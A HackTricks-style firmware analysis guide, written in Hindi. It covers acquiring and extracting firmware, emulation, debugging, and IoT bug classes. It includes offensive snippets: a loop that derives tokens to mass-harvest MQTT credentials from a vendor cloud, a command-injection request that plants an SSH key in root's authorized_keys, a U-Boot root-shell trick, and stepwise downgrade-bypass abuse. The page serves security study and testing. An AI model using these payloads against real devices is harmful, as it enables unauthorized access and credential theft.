# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **परिचय**

### संबंधित संसाधन


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware आवश्यक software है, जो hardware components और users द्वारा interact किए जाने वाले software के बीच communication को manage और facilitate करके devices को सही तरीके से operate करने में सक्षम बनाता है। यह permanent memory में stored रहता है, जिससे device के powered on होते ही vital instructions उपलब्ध रहती हैं और operating system launch हो सकता है। Security vulnerabilities की पहचान करने में Firmware की जांच करना और संभावित रूप से उसमें बदलाव करना एक महत्वपूर्ण step है।

## **जानकारी एकत्र करना**

**जानकारी एकत्र करना** किसी device की संरचना और उसके द्वारा उपयोग की जाने वाली technologies को समझने का एक महत्वपूर्ण प्रारंभिक step है। इस process में निम्नलिखित data एकत्र किया जाता है:

- CPU architecture और उस पर चलने वाला operating system
- Bootloader से संबंधित विवरण
- Hardware layout और datasheets
- Codebase metrics और source locations
- External libraries और license types
- Update histories और regulatory certifications
- Architectural और flow diagrams
- Security assessments और पहचानी गई vulnerabilities

इस उद्देश्य के लिए, **open-source intelligence (OSINT)** tools अत्यंत उपयोगी हैं। उपलब्ध open-source software components का manual और automated review processes के माध्यम से analysis भी महत्वपूर्ण है। [Coverity Scan](https://scan.coverity.com) और [Semmle’s LGTM](https://lgtm.com/#explore) जैसे tools free static analysis प्रदान करते हैं, जिनका उपयोग संभावित issues खोजने के लिए किया जा सकता है।

## **Firmware प्राप्त करना**

Firmware प्राप्त करने के कई तरीके हैं, जिनमें से प्रत्येक की complexity का स्तर अलग होता है:

- Source (developers, manufacturers) से **सीधे**
- दिए गए instructions से इसे **Build** करना
- Official support sites से **Download** करना
- Hosted firmware files खोजने के लिए **Google dork** queries का उपयोग करना
- [S3Scanner](https://github.com/sa7mon/S3Scanner) जैसे tools के साथ **cloud storage** को सीधे access करना
- Man-in-the-middle techniques के माध्यम से **updates** को intercept करना
- **UART**, **JTAG**, या **PICit** जैसे connections के माध्यम से device से **Extract** करना
- Device communication के भीतर update requests के लिए **Sniffing** करना
- **Hardcoded update endpoints** की पहचान करके उनका उपयोग करना
- Bootloader या network से **Dumping** करना
- जब अन्य सभी तरीके विफल हो जाएं, तो उचित hardware tools का उपयोग करके storage chip को **Remove और read** करना

### केवल UART logs: flash में U-Boot env के माध्यम से root shell force करना

यदि UART RX को ignore किया जाता है (केवल logs), तो आप offline **U-Boot environment blob को edit** करके init shell force कर सकते हैं:

1. SOIC-8 clip + programmer (3.3V) के साथ SPI flash dump करें:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition का पता लगाएं, `bootargs` को edit करके उसमें `init=/bin/sh` शामिल करें, और **U-Boot env CRC32** को blob के लिए दोबारा compute करें।
3. केवल env partition को reflash करें और reboot करें; UART पर shell दिखाई देनी चाहिए।

यह उन embedded devices पर उपयोगी है, जहां bootloader shell disabled है, लेकिन external flash access के माध्यम से env partition writable है।

## Firmware का analysis करना

अब जब आपके पास **Firmware है**, तो आपको इसके बारे में information extract करनी होगी ताकि यह समझ सकें कि इसे कैसे handle करना है। इसके लिए आप अलग-अलग tools का उपयोग कर सकते हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
यदि आपको उन tools से अधिक जानकारी नहीं मिलती है, तो `binwalk -E <bin>` से image की **entropy** जांचें। यदि entropy कम है, तो इसके encrypted होने की संभावना कम है। यदि entropy अधिक है, तो इसके encrypted होने की संभावना है (या यह किसी तरह compressed हो सकती है)।

इसके अलावा, आप इन tools का उपयोग **firmware के अंदर embedded files** extract करने के लिए कर सकते हैं:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

या file का निरीक्षण करने के लिए [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) का उपयोग कर सकते हैं।

### Filesystem प्राप्त करना

ऊपर बताए गए `binwalk -ev <bin>` जैसे tools से आपको **filesystem extract** करने में सक्षम होना चाहिए।\
Binwalk आमतौर पर इसे **filesystem type के नाम वाले folder** के अंदर extract करता है, जो आमतौर पर निम्न में से एक होता है: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs।

#### Manual Filesystem Extraction

कभी-कभी binwalk के signatures में filesystem का **magic byte** मौजूद **नहीं होता**। ऐसे मामलों में, binary में filesystem का offset **ढूंढने** और compressed filesystem को binary से **carve** करने के लिए binwalk का उपयोग करें, फिर नीचे दिए गए steps का उपयोग करके इसके type के अनुसार filesystem को **manually extract** करें।
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
निम्नलिखित **dd command** चलाकर Squashfs filesystem को carve करें।
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
वैकल्पिक रूप से, निम्नलिखित command भी चलाई जा सकती है।

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs (ऊपर दिए गए उदाहरण में उपयोग किया गया)

`$ unsquashfs dir.squashfs`

इसके बाद files "`squashfs-root`" directory में होंगी।

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems के लिए

`$ jefferson rootfsfile.jffs2`

- NAND flash वाले ubifs filesystems के लिए

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware का Analysis

Firmware प्राप्त हो जाने के बाद, उसकी structure और संभावित vulnerabilities को समझने के लिए उसका गहन विश्लेषण करना आवश्यक है। इस प्रक्रिया में Firmware image का analysis और उससे उपयोगी data extract करने के लिए विभिन्न tools का उपयोग किया जाता है।

### प्रारंभिक Analysis Tools

Binary file (जिसे `<bin>` कहा गया है) के प्रारंभिक inspection के लिए commands का एक set दिया गया है। ये commands file types की पहचान करने, strings extract करने, binary data का analysis करने और partition तथा filesystem details को समझने में सहायता करती हैं:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Image की encryption status का आकलन करने के लिए, `binwalk -E <bin>` से **entropy** की जाँच की जाती है। Low entropy encryption की कमी का संकेत देता है, जबकि high entropy संभावित encryption या compression को दर्शाता है।

**embedded files** को extract करने के लिए, **file-data-carving-recovery-tools** documentation और file inspection के लिए **binvis.io** जैसे tools और resources की अनुशंसा की जाती है।

### Filesystem को Extract करना

`binwalk -ev <bin>` का उपयोग करके आमतौर पर filesystem को extract किया जा सकता है, अक्सर एक ऐसी directory में जिसका नाम filesystem type (जैसे, squashfs, ubifs) के नाम पर होता है। हालाँकि, जब **binwalk** missing magic bytes के कारण filesystem type को पहचानने में विफल रहता है, तो manual extraction आवश्यक होती है। इसमें filesystem के offset का पता लगाने के लिए `binwalk` का उपयोग करना और उसके बाद filesystem को carve out करने के लिए `dd` command चलाना शामिल है:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
इसके बाद, filesystem के प्रकार (जैसे, squashfs, cpio, jffs2, ubifs) के आधार पर contents को manually extract करने के लिए अलग-अलग commands का उपयोग किया जाता है।

### Filesystem Analysis

Filesystem extract होने के बाद security flaws की खोज शुरू होती है। insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts और offline analysis के लिए compiled binaries पर ध्यान दिया जाता है।

**जिन महत्वपूर्ण locations** और **items** का inspection करना चाहिए, उनमें शामिल हैं:

- user credentials के लिए **etc/shadow** और **etc/passwd**
- **etc/ssl** में SSL certificates और keys
- संभावित vulnerabilities के लिए configuration और script files
- आगे के analysis के लिए embedded binaries
- सामान्य IoT device web servers और binaries

Filesystem के भीतर sensitive information और vulnerabilities खोजने में कई tools सहायता करते हैं:

- sensitive information search के लिए [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) और [**Firmwalker**](https://github.com/craigz28/firmwalker)
- व्यापक firmware analysis के लिए [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static और dynamic analysis के लिए [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) और [**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binaries पर Security Checks

Filesystem में मिले source code और compiled binaries दोनों की vulnerabilities के लिए सावधानीपूर्वक जांच की जानी चाहिए। Unix binaries के लिए **checksec.sh** और Windows binaries के लिए **PESecurity** जैसे tools उन unprotected binaries की पहचान करने में सहायता करते हैं जिनका exploit किया जा सकता है।

## Derived URL tokens के माध्यम से cloud config और MQTT credentials प्राप्त करना

कई IoT hubs अपने per-device configuration को ऐसे cloud endpoint से fetch करते हैं:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis के दौरान आपको पता चल सकता है कि `<token>` को device ID से locally, hardcoded secret का उपयोग करके derive किया जाता है, उदाहरण के लिए:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

यह design ऐसे किसी भी व्यक्ति को, जिसे deviceId और STATIC_KEY पता हो, URL reconstruct करने और cloud config pull करने में सक्षम बनाता है। इससे अक्सर plaintext MQTT credentials और topic prefixes उजागर हो जाते हैं।

Practical workflow:

1) UART boot logs से deviceId extract करें

- एक 3.3V UART adapter (TX/RX/GND) connect करें और logs capture करें:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- उन पंक्तियों को खोजें जो cloud config URL pattern और broker address प्रिंट करती हैं, उदाहरण के लिए:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware से STATIC_KEY और token algorithm Recover करें

- Binaries को Ghidra/radare2 में Load करें और config path ("/pf/") या MD5 usage को search करें।
- algorithm की पुष्टि करें (जैसे, MD5(deviceId||STATIC_KEY))।
- Bash में token Derive करें और digest को uppercase में बदलें:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config और MQTT credentials collect करें

- URL तैयार करें और curl से JSON pull करें; secrets extract करने के लिए jq से parse करें:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) plaintext MQTT और कमजोर topic ACLs का दुरुपयोग (यदि मौजूद हों)

- recovered credentials का उपयोग करके maintenance topics को subscribe करें और संवेदनशील घटनाओं की तलाश करें:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) अनुमानित device IDs की enumeration करें (बड़े पैमाने पर, authorization के साथ)

- कई ecosystems में vendor OUI/product/type bytes के बाद एक sequential suffix शामिल होता है।
- आप candidate IDs को iterate कर सकते हैं, programmatically tokens derive कर सकते हैं और configs fetch कर सकते हैं:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
नोट्स
- mass enumeration का प्रयास करने से पहले हमेशा explicit authorization प्राप्त करें।
- जब संभव हो, target hardware में बदलाव किए बिना secrets recover करने के लिए emulation या static analysis को प्राथमिकता दें।

firmware को emulate करने की प्रक्रिया किसी device के operation या किसी individual program का **dynamic analysis** सक्षम बनाती है। इस approach में hardware या architecture dependencies के कारण challenges आ सकते हैं, लेकिन matching architecture और endianness वाले device, जैसे Raspberry Pi, या पहले से तैयार virtual machine में root filesystem या specific binaries transfer करने से आगे की testing में सुविधा मिल सकती है।

### Individual Binaries को Emulate करना

Single programs की जांच के लिए, program के endianness और CPU architecture की पहचान करना महत्वपूर्ण है।

#### MIPS Architecture के साथ Example

MIPS architecture binary को emulate करने के लिए, यह command इस्तेमाल की जा सकती है:
```bash
file ./squashfs-root/bin/busybox
```
और आवश्यक emulation tools इंस्टॉल करने के लिए:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) के लिए `qemu-mips` का उपयोग किया जाता है, और little-endian binaries के लिए `qemu-mipsel` चुना जाएगा।

#### ARM Architecture Emulation

ARM binaries के लिए प्रक्रिया समान है, जिसमें emulation के लिए `qemu-arm` emulator का उपयोग किया जाता है।

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) और अन्य tools full firmware emulation को सक्षम बनाते हैं, process को automate करते हैं और dynamic analysis में सहायता करते हैं।

## Dynamic Analysis in Practice

इस stage पर analysis के लिए किसी real या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation hardware interactions की पूरी तरह सटीक नकल नहीं कर सकती, इसलिए कभी-कभी emulation को restart करना पड़ सकता है। Analysis में filesystem की दोबारा जांच करनी चाहिए, exposed webpages और network services को exploit करना चाहिए, तथा bootloader vulnerabilities का पता लगाना चाहिए। संभावित backdoor vulnerabilities की पहचान करने के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis Techniques

Runtime analysis में किसी process या binary के operating environment में उसके साथ interact किया जाता है। इसके लिए gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग करके breakpoints set किए जाते हैं और fuzzing तथा अन्य techniques के माध्यम से vulnerabilities की पहचान की जाती है।

पूर्ण debugger के बिना embedded targets के लिए, device पर एक statically-linked `gdbserver` **copy करें** और remotely attach करें:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubs पर RF stack अक्सर एक **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है कि इस path को map किया जाए:

1. हवा में मौजूद **RF frame**
2. radio MCU पर मौजूद **controller-side parser**
3. Linux को forward किया जाने वाला **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में मौजूद **application dispatcher**
5. **protocol-specific handler / state machine**

यह architecture एक के बजाय reversing के दो targets बनाता है। यदि controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो निम्न को recover करें:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से स्वयं controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery या firmware/model download phases के दौरान reachable हैं

विशेष रूप से Zigbee के लिए, pairing traffic capture करें और जांचें कि target अभी भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है या नहीं। यदि ऐसा है, तो commissioning traffic को sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस exposure को कम करते हैं, इसलिए ध्यान दें कि tested device वास्तव में उन्हें enforce करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुंचते हैं।

Practical workflow:

- command dispatcher को reverse करें और **vendor-only handler** मिलने तक उसका अनुसरण करें।
- **FSM state**, **event**, **check**, **action** और **next-state** tables को recover करें।
- उन **transitional states** की पहचान करें जो auto-advance होते हैं, तथा उन retry/error branches की भी जो अंततः attacker-controlled state को reset या free करती हैं।
- buggy handler हमेशा reachable है, ऐसा मानने के बजाय यह confirm करें कि daemon को vulnerable state में रखने के लिए कौन-से legitimate protocol exchanges आवश्यक हैं।

Timing-sensitive protocols के लिए, Python framework से packet replay बहुत धीमा हो सकता है। अधिक reliable तरीका है कि real hardware (उदाहरण के लिए एक **nRF52840**) पर legitimate device को vendor-grade stack के साथ emulate किया जाए, ताकि सही **endpoints**, **attributes** और commissioning timing expose की जा सके।

### Embedded daemons में fragmented-download bug class

**fragmented blob/model/configuration downloads** में firmware bugs की एक recurring class दिखाई देती है:

1. **first fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields, जैसे `packet_total_size >= offset + chunk_len`, को validate करते हैं।
3. Copy `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग करती है, लेकिन **original allocated size** के विरुद्ध check नहीं करती।

इससे attacker निम्न भेज सकता है:

- एक valid first fragment जिसमें **small** declared total size हो, ताकि छोटा heap allocation कराया जा सके।
- **expected offset** वाला बाद का fragment, लेकिन बड़ा `chunk_len` हो।
- forged packet-local size, जो नए checks को satisfy करे, जबकि मूल allocated buffer फिर भी overflow हो जाए।

जब vulnerable path commissioning logic के पीछे हो, तो malformed fragments भेजने से पहले target को expected model-download या blob-download state में ले जाने के लिए पर्याप्त **device emulation** शामिल करनी होगी।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतजार करना" नहीं, बल्कि **protocol के अपने error handling को force करना** होता है:

- malformed follow-up fragments भेजकर FSM को **retry** या **error** states में पहुंचाएं।
- retry threshold पार करें, ताकि daemon **context reset** करे और corrupted buffer को free करे।
- इस predictable `free()` का उपयोग allocator-side primitives trigger करने के लिए करें, इससे पहले कि process unrelated कारणों से crash हो।

यह embedded Linux में मौजूद **musl/uClibc/dlmalloc-like** allocators के विरुद्ध विशेष रूप से उपयोगी है, जहां chunk metadata corrupt करने से unlink/unbin logic write primitive में बदल सकता है। एक stable pattern यह है कि **size field** को corrupt करके allocator traversal को overflowed buffer के अंदर staged **fake chunks** की ओर redirect किया जाए, बजाय इसके कि real bin pointers को तुरंत overwrite करके process crash करा दिया जाए।

## Binary Exploitation और Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming आवश्यक है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन जब वे मौजूद हों, तो Return Oriented Programming (ROP) जैसी techniques आवश्यक हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc के समान fastbins का उपयोग करता है। बाद का large allocation `__malloc_consolidate()` trigger कर सकता है, इसलिए किसी भी fake chunk को checks (सही size, `fd = 0`, और surrounding chunks को "in use" माना जाना) पार करने योग्य होना चाहिए।
- **Non-PIE binaries under ASLR:** यदि ASLR enabled है लेकिन main binary **non-PIE** है, तो in-binary `.data/.bss` addresses stable रहते हैं। आप ऐसे region को target कर सकते हैं जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation को **function pointer table** पर land कराया जा सके।
- **Parser-stopping NUL:** JSON parse होने पर payload में मौजूद `\x00` parsing रोक सकता है, जबकि trailing attacker-controlled bytes stack pivot/ROP chain के लिए बने रहते हैं।
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` और `write()` call करने वाली ROP chain किसी known mapping में executable shellcode रखकर उस पर jump कर सकती है।

## Firmware Analysis के लिए Prepared Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए pre-configured environments उपलब्ध कराते हैं, जिनमें आवश्यक tools मौजूद होते हैं।

## Firmware का विश्लेषण करने के लिए Prepared OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक ऐसी distro है जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में सहायता करना है। यह सभी आवश्यक tools से युक्त pre-configured environment देकर आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से loaded हैं।

## Firmware Downgrade Attacks और Insecure Update Mechanisms

भले ही vendor firmware images के लिए cryptographic signature checks लागू करे, **version rollback (downgrade) protection अक्सर omitted रहती है**। जब boot- या recovery-loader embedded public key से केवल signature verify करता है, लेकिन flash की जा रही image के *version* (या monotonic counter) की तुलना नहीं करता, तो attacker वैध रूप से एक **older, vulnerable firmware** install कर सकता है, जिस पर valid signature अब भी मौजूद होती है, और इस प्रकार patched vulnerabilities फिर से introduce की जा सकती हैं।

Typical attack workflow:

1. **एक older signed image प्राप्त करें**
* इसे vendor के public download portal, CDN या support site से प्राप्त करें।
* इसे companion mobile/desktop applications से extract करें (जैसे Android APK के अंदर `assets/firmware/` में)।
* इसे VirusTotal, Internet archives, forums आदि जैसे third-party repositories से retrieve करें।
2. किसी exposed update channel के माध्यम से image को device पर **upload या serve करें**:
* Web UI, mobile-app API, USB, TFTP, MQTT आदि।
* कई consumer IoT devices *unauthenticated* HTTP(S) endpoints expose करते हैं, जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade trigger करते हैं।
3. Downgrade के बाद उस vulnerability का exploit करें जिसे newer release में patch किया गया था (उदाहरण के लिए बाद में जोड़ा गया command-injection filter)।
4. Persistence हासिल होने के बाद detection से बचने के लिए वैकल्पिक रूप से latest image को फिर से flash करें या updates disable करें।

### Example: Downgrade के बाद Command Injection
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Vulnerable (downgraded) firmware में `md5` parameter को बिना sanitisation के सीधे shell command में concatenate किया जाता है, जिससे arbitrary commands inject करना संभव होता है (यहाँ – SSH key-based root access enable करना)। बाद के firmware versions में एक basic character filter जोड़ा गया, लेकिन downgrade protection की अनुपस्थिति के कारण यह fix बेअसर हो जाता है।

### Mobile Apps से Firmware Extract करना

कई vendors अपने companion mobile applications के अंदर full firmware images शामिल करते हैं, ताकि app Bluetooth/Wi-Fi के माध्यम से device को update कर सके। ये packages आमतौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths के अंतर्गत unencrypted रूप में stored होते हैं। `apktool`, `ghidra` या सामान्य `unzip` जैसे tools physical hardware को छुए बिना signed images को extract करने की सुविधा देते हैं।
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot designs में केवल updater-आधारित anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic के अंदर (उदाहरण के लिए, CAN पर UDS routine, recovery command या userspace OTA agent)। यदि **bootloader** बाद में केवल image signature/CRC जांचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को अभी भी bypass किया जा सकता है।

सामान्य कमजोर design:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में stored value से करता है और पुराने signed images को अस्वीकार करता है।
- **Bootloader** उस ratchet को parse नहीं करता और boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को partition table या per-slot generation counter में अलग से store किया जाता है और इसे validated exact firmware digest से cryptographically bind नहीं किया जाता।

इससे dual-slot systems में **validate-one-image / boot-another-image** primitive बनता है। यदि attacker updater से slot B को current signed image का उपयोग करके next boot target mark करवा सकता है और reboot से पहले slot B को overwrite कर सकता है, तो bootloader downgraded image को boot कर सकता है क्योंकि वह केवल पहले से committed slot metadata पर भरोसा करता है।

सामान्य abuse pattern:

1. Passive slot में एक **current signed** firmware upload करें और normal validation/switch routine चलाएं, ताकि layout उस slot को next active के रूप में mark कर दे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine में दोबारा प्रवेश करें।
3. Stale boot-state या stale slot-selection logic का abuse करें, ताकि updater उसी physical slot को erase करे जिसे अभी promote किया गया था।
4. उस slot में एक **older but still signed** firmware लिखें।
5. उस validation routine को skip करें जो ratchet लागू करती है और सीधे reboot करें।
6. Bootloader promoted slot को select करता है, केवल signature/integrity verify करता है और पुराने image को boot कर देता है।

A/B update implementations को reverse करते समय इन चीजों को देखें:

- Slot selection, **boot-time flags** से derived हो और successful switch के बाद refresh न किए जाते हों।
- `prepare_passive_slot()`-style routine, **current committed layout** के बजाय stale state के आधार पर slot erase करती हो।
- `part_write_layout()`-style function केवल **generation counter** / active flag बढ़ाता हो और validated image hash store न करता हो।
- Ratchet checks userspace या updater code में implemented हों, लेकिन ROM / bootloader / secure boot stages में **न हों**।
- Erase या recovery routines slot की content हटाने और दोबारा लिखे जाने के बाद भी उसे bootable mark करके छोड़ देती हों।

### Update Logic का Assessment Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से protected है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के अंदर verify किया जाता है (जैसे signatures को ROM code द्वारा check किया जाता है)?
* क्या **bootloader updater के समान ratchet लागू करता है**, या केवल signature/CRC check करता है?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot को modify किया जा सकता है?
* Slot switch सफल होने के बाद क्या device को reboot करने के लिए बाध्य किया जाता है, या बाद की update/erase routines उसी session में अभी भी reachable रहती हैं?
* क्या userland code additional sanity checks करता है (जैसे allowed partition map, model number)?
* क्या *partial* या *backup* update flows उसी validation logic को दोबारा उपयोग करते हैं?

> 💡  यदि ऊपर दी गई कोई भी चीज missing है, तो platform rollback attacks के प्रति संभवतः vulnerable है।

## अभ्यास के लिए Vulnerable firmware

Firmware में vulnerabilities खोजने का अभ्यास करने के लिए, शुरुआत के तौर पर निम्नलिखित vulnerable firmware projects का उपयोग करें।

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys recover करना

जब कोई update image छोटी plaintext metadata को बड़े high-entropy blob के साथ mix करती है, तो किसी भी brute-forcing से पहले container triage करें:

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries dump करें।
- `Salted__` का सामान्यतः अर्थ OpenSSL `enc` format होता है: अगले 8 bytes salt होते हैं और शेष bytes ciphertext होते हैं।
- ऐसा Base64 field जो decode होने पर ठीक `256` bytes का हो, एक मजबूत संकेत है कि आप RSA-2048 ciphertext देख रहे हैं, जो random firmware password/session key को wrap करता है।
- उसी file में मौजूद Detached PGP material अक्सर केवल authenticity को protect करता है; यह न मानें कि यही confidentiality mechanism है।

यदि static key hunting (`grep`, `strings`, PEM/PGP searches) विफल हो जाए, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और trace करें कि encrypted blob को कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है और वह किस logical key name का अनुरोध करता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के equivalent के रूप में देखें।

यदि appliance original Vault binary और storage backend के साथ ship होता है, तो Vault internals को फिर से implement करने की तुलना में उस environment को replay करना आमतौर पर आसान होता है:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

